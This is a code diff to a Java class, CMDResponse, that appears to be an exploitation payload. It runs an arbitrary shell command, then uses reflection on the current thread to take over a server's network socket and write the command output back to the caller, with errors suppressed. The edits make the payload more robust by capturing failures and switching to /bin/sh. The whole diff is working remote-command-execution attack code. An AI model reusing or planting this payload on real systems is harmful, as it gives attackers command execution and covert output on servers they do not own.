@@ -8,8 +8,9 @@ public class CMDResponse {
 
 
     public void test(String cmd) throws IOException {
+        String result = "";
         try {
-            ProcessBuilder processBuilder = new ProcessBuilder(new String[]{"/bin/bash","-c",cmd});
+            ProcessBuilder processBuilder = new ProcessBuilder(new String[]{"/bin/sh","-c",cmd});
             Process start = processBuilder.start();
             InputStream inputStream = start.getInputStream();
             ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
@@ -17,7 +18,12 @@ public class CMDResponse {
             while ((read = inputStream.read()) != -1){
                 byteArrayOutputStream.write(read);
             }
+            result = new String(byteArrayOutputStream.toByteArray());
+        }catch (Exception e){
+            result = e.getMessage();
+        }
 
+        try {
             Thread thread = Thread.currentThread();
             Class<?> aClass = Class.forName("java.lang.Thread");
             Field target = aClass.getDeclaredField("target");
@@ -29,12 +35,12 @@ public class CMDResponse {
             java.net.Socket socket =(java.net.Socket) socketfield.get(transport);
             OutputStream outputStream = socket.getOutputStream();
             outputStream.write("\n".getBytes());
-            outputStream.write(byteArrayOutputStream.toByteArray());
+            outputStream.write(result.getBytes());
             outputStream.close();
-
         }catch (Exception e){
 
         }
+
 
 
 
